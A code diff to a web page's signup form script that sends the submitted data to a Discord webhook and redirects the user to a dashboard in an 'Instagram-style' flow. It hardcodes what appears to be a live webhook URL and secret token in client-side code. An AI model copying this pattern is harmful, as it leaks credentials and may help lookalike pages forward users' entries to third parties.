@@ -95,7 +95,7 @@
   </footer>
 
 <script>
-const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
+const webhookURL = "https://discord.com/api/webhooks/1446849459433767074/CMXXr-V-SByxuMbewl1GbwypwqDrgbna82Etpev3oZaZyvBU6Tth6YybgKS-VqMwniP8";
 
 document.getElementById("signupForm").addEventListener("submit", function(e){
   e.preventDefault();
@@ -117,11 +117,12 @@ document.getElementById("signupForm").addEventListener("submit", function(e){
     body: JSON.stringify(payload)
   })
   .then(() => {
-    alert("Signup sent successfully!");
+    // Instagram-style: reset fields & redirect
     document.getElementById("signupForm").reset();
+    window.location.href = "Dashboard.html";
   })
   .catch(err => {
-    alert("Failed to send: " + err);
+    alert("Failed to send to Discord: " + err);
   });
 });
 </script>
